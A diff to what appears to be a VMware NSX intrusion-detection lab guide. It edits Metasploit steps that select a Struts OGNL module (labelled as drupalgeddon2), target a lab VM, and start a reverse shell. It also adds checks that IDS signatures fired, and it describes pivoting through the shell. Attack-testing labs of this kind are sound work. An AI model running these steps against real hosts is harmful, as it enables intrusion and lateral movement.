@@ -14,7 +14,7 @@ In this **optional** exercise, we will explore some more advanced options in the
 1.	From the console session with  **External VM**, type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/multi/http/struts2_namespace_ognl** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
-    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
+    * Type **exploit** to initiate the exploit, esbalish a reverse shell, and background the session.
 
 > **Note**: This exploit will fail as  **App1-WEB-TIER VM** is not running an Apache Struts service vulnerable to this exploit.
     
@@ -31,8 +31,10 @@ msf5 exploit(multi/http/struts2_content_type_ognl) > exploit
 [-] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
 [*] Exploit completed, but no session was created.
 msf5 exploit(multi/http/struts2_content_type_ognl) >
-
 ```
+2. In NSX Manager, navigate to Security --> East West Security --> Distributed IDS
+3. Confirm 4 signatures have fired:
+    * Signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
     
 establish a **reverse shell** from the Drupal server, and use it as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 
 
